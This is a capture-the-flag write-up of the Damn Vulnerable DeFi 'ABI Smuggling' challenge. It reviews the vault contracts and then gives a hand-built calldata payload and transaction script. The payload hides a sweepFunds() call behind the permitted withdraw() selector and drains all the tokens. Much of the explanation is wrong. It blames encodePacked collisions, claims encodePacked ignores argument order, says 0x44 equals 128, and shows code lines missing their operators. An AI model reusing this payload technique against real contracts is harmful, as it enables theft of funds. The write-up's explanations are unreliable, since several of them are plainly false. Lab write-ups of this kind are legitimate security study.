<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/15.png">

# Target Contract Review

Given contracts.

**AuthorizedExecutor.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title AuthorizedExecutor
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
abstract contract AuthorizedExecutor is ReentrancyGuard {
    using Address for address;

    bool public initialized;

    // action identifier => allowed
    mapping(bytes32 => bool) public permissions;

    error NotAllowed();
    error AlreadyInitialized();

    event Initialized(address who, bytes32[] ids);

    /**
     * @notice Allows first caller to set permissions for a set of action identifiers
     * @param ids array of action identifiers
     */
    function setPermissions(bytes32[] memory ids) external {
        if (initialized) {
            revert AlreadyInitialized();
        }

        for (uint256 i = 0; i < ids.length;) {
            unchecked {
                permissions[ids[i]] = true;
                ++i;
            }
        }
        initialized = true;

        emit Initialized(msg.sender, ids);
    }

    /**
     * @notice Performs an arbitrary function call on a target contract, if the caller is authorized to do so.
     * @param target account where the action will be executed
     * @param actionData abi-encoded calldata to execute on the target
     */
    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

        _beforeFunctionCall(target, actionData);

        return target.functionCall(actionData);
    }

    function _beforeFunctionCall(address target, bytes memory actionData) internal virtual;

    function getActionId(bytes4 selector, address executor, address target) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(selector, executor, target));
    }
}
```

The `AuthorizedExecutor` contract is a base contract that allows a caller to execute arbitrary function calls on a target contract, but only if the caller is authorized to do so. It provides a mechanism for managing permissions for different actions.

`setPermissions()` :  Allows the first caller to set permissions for a set of action identifiers. It takes an array of action identifiers as a parameter and sets the corresponding permissions to true. If the contract has already been initialized, calling this function will revert.

`execute()` : Performs an arbitrary function call on a target contract if the caller is authorized to do so. It takes the target contract address and the calldata for the function call as parameters. Before executing the function call, it checks if the caller has the necessary permission for the action. 

`getActionId()` : Generates an action identifier based on the function selector, the executor's address, and the target contract's address. It uses the keccak256 hash function to generate a unique identifier.

**SelfAuthorizedVault.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./AuthorizedExecutor.sol";

/**
 * @title SelfAuthorizedVault
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfAuthorizedVault is AuthorizedExecutor {
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp = block.timestamp;

    error TargetNotAllowed();
    error CallerNotAllowed();
    error InvalidWithdrawalAmount();
    error WithdrawalWaitingPeriodNotEnded();

    modifier onlyThis() {
        if (msg.sender != address(this)) {
            revert CallerNotAllowed();
        }
        _;
    }

    /**
     * @notice Allows to send a limited amount of tokens to a recipient every now and then
     * @param token address of the token to withdraw
     * @param recipient address of the tokens' recipient
     * @param amount amount of tokens to be transferred
     */
    function withdraw(address token, address recipient, uint256 amount) external onlyThis {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp WAITING_PERIOD) {
            revert WithdrawalWaitingPeriodNotEnded();
        }

        _lastWithdrawalTimestamp = block.timestamp;

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    function sweepFunds(address receiver, IERC20 token) external onlyThis {
        SafeTransferLib.safeTransfer(address(token), receiver, token.balanceOf(address(this)));
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _beforeFunctionCall(address target, bytes memory) internal view override {
        if (target != address(this)) {
            revert TargetNotAllowed();
        }
    }
}
```

The `SelfAuthorizedVault` contract is a smart contract that allows for the controlled withdrawal of tokens. It implements a self-authorization mechanism where the contract itself determines when and how much tokens can be withdrawn.

`withdraw()` : Allows the contract to send a limited amount of tokens to a specified recipient. If the withdrawal amount exceeds the withdrawal limit or the waiting period has not ended, the function reverts. Otherwise, the function transfers the specified amount of tokens to the recipient using the `SafeTransferLib` library.

`sweepFunds()` : Allows the contract to sweep all the remaining tokens in the contract to a specified receiver address.

`getLastWithdrawalTimestamp()` : Returns the timestamp of the last withdrawal made.

`_beforeFunctionCall()` : This internal function is part of the `AuthorizedExecutor` contract, which the `SelfAuthorizedVault` contract inherits from. It is used to check if a function call is allowed. In this case, it ensures that the target of the function call is the contract itself (`address(this)`).

Overall, the contract is designed to provide controlled access to the stored tokens, allowing for limited and regulated withdrawals.



Challenge's message:

> There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.
The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.
The dev team has received a responsible disclosure saying all funds can be stolen.
Before it’s too late, rescue all funds from the vault, transferring them back to the recovery account.


# ABI Encoding Of Dynamic Types

There are two ways of encoding using the ABI. We can encode the datas with `.encode()` or `.encodePacked()` methods. If you don't know how this methods works well, you should read [this documention](https://docs.soliditylang.org/en/v0.8.11/abi-spec.html). 


When we encode the dynamic structes using with `encode()`, we are fallowing this steps:

- **The offset of the dynamic data**.
- **The length of the dynamic data**.
- **The actual value of the dynamic data**.

```
Memory Location |    Data
0x00            |    0000000000000000000000000000000000000000000000000000000000000020 // The offset of the data (32 in decimal)
0x20            |    000000000000000000000000000000000000000000000000000000000000000d // The length of the data in bytes (13 in decimal)
0x40            |    48656c6c6f2c20776f726c642100000000000000000000000000000000000000 // Value
```

If you hex decode 48656c6c6f2c20776f726c6421 you will get "Hello, world!".


When you use `.encodePacked()` with dynamic types (like strings or arrays), it can create a potential for **crafting collisions**, which means different inputs may produce the same encoded output. This can have security implications, especially in cases where uniqueness or unpredictability is important.

<p align="center"><img width="500" src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/1633f8fd-80d3-4498-983f-728d61a22e4e"></p>


Here's the reasons of why `.encodePacked()` can create craft collisions with dynamic types:

- **Dynamic Data Length**: Dynamic types, such as strings or arrays, can have varying lengths. When you use `.encodePacked()` on dynamic data, **it doesn't include the length information in the encoding**. Instead, it concatenates the data as-is, one after the other.

- **No Delimiters**: `.encodePacked()` doesn't include any delimiters or separators between the different dynamic data elements. It simply concatenates them.

- **Predictable Concatenation**: Since the encoding process is deterministic (the same input will always produce the same output), if you have two different sets of dynamic data that happen to concatenate in the same order, they will produce the same encoded output.

This lack of differentiation between different dynamic data inputs can be exploited by hackers to create crafted inputs that collide (produce the same output) in a way that benefits them. For example, if two different inputs produce the same hash or identifier, it can lead to unexpected behavior in a smart contract, potentially allowing an attacker to **bypass security checks or gain unauthorized access**.


Consider that we have a `encode()` function which checks the encoded hashes.

```solidity
contract Vulnerable {
    function encode(string memory data1, string memory data2) public pure returns (bytes32) {
        bytes32 hash1 = keccak256(abi.encodePacked(data1, data2));
        bytes32 hash2 = keccak256(abi.encodePacked(data2, data1)); // Reversed order

        return hash1 == hash2 ? hash1 : bytes32(0); // Return hash1 if they match, otherwise return 0
    }
}
```

If `data1` is "Hello" and `data2` is "World," calling encode("Hello", "World") and encode("World", "Hello") will produce the same hash because `.encodePacked()` doesn't consider the order of concatenation.

# Subverting

When we look at the abi-smuggling.challenge.js file, we have permission to access the function selectors `0x85fb709d` and `0xd9caed12` which are `sweepFunds()` and `withdraw()` functions in the `SelfAuthorizedVault` contract. Also this functions are selected `onlyThis` modifier. Which means, only the `SelfAuthorizedVault` contract can call these functions.

To bypass this problem we can call `execute()` function to trigger `functionCall()` method. However, we need to pass the authentication mechanism.

```solidity
if (!permissions[getActionId(selector, msg.sender, target)]) {
  revert NotAllowed();
}
```

Thankfully, the `getActionId()` function encode the values with `encodePacked()` method. As we previously mentioned [from here](https://github.com/wasny0ps/Damn-Vulnerable-DeFi/tree/main/Challenges/ABI%20Smuggling#abi-encoding-of-dynamic-types), this method causes a craft collision when used with dynamic types.

Also, we are authorized only `withdraw()`, but we want to call `sweepFunds()` function.

> Checking a static position in clearly manipulable calldata can serve as an effective way to bypass permissions, granting us the ability to execute our desired actions. In this specific scenario, this is where `sweepFunds()` comes into play.

When we look at how authorization of `execute()` works, the `selector` is 4 bytes at the offset 100 in calldata.

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
  // Read the 4-bytes selector at the beginning of `actionData`
  bytes4 selector;
  uint256 calldataOffset = 4 32 * 3; // calldata position where `actionData` begins
  assembly {
    selector := calldataload(calldataOffset)
  }
```

If we call execute function in this way, transaction will reverted with `NotAllowed()` error and the data's value looks like this:

```js
const calldata = vault.interface.encodeFunctionData('sweepFunds', [recovery.address, token.address])
const data = vault.interface.encodeFunctionData('execute', [vault.address, calldata])
console.log(data)
await player.sendTransaction({
            to: vault.address,
            data: data
        })
```
```
// Data
0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f05120000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
```

Let's explain it shortly.

```
// 4 byte selector for 'execute'
0x1cff79cd
// vault.address (1. param of execute)
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
// 32 byte calldata offset (2. param of execute)
0000000000000000000000000000000000000000000000000000000000000040
// 32 byte calldata length
0000000000000000000000000000000000000000000000000000000000000044
// Actual calldata, selector is starting at offset 100 from the start of the calldata
85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
```

Then, we will change the value into this:

```
// execute selector
0x1cff79cd
// vault.address
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
// offset -> start of the calldata (128 bytes in decimal - 4 x 32 bytes)
0000000000000000000000000000000000000000000000000000000000000080
// empty data (third 32 bytes)
0000000000000000000000000000000000000000000000000000000000000000
// insert the withdraw selector at offset 100 from the start of entire calldata
d9caed1200000000000000000000000000000000000000000000000000000000
// start of the calldata (calldata length) (0x44 = 128 in decimal) 4x32 bytes = 0x80 = 128 offset
0000000000000000000000000000000000000000000000000000000000000044
// sweepFunds calldata
85fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
```

Thus, `sweepFunds()` getting smuggled behind withdraw's function signature to trigger a bypass. So that the contract authorizes us by manipulating calldata.

Here are the attacker commands:

```js
const payload = "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000"
await player.sendTransaction({
            to: vault.address,
            data: payload
        })
```

Solve the challenge.

```powershell

  [Challenge] ABI smuggling
    ✔ Execution (176ms)


  1 passing (2s)

Done in 3.38s.
```

## Security Takeaways

To mitigate this issue, it's important to be cautious when using `.encodePacked()` with dynamic types. Consider using more robust methods for encoding and hashing dynamic data, such as using keccak256 (SHA-3) with appropriate delimiters and length information, or utilizing cryptographic libraries designed for data serialization and hashing. Additionally, always implement appropriate security checks and validation to prevent malicious input or collisions from causing unexpected issues in your smart contracts.

**_by wasny0ps_**
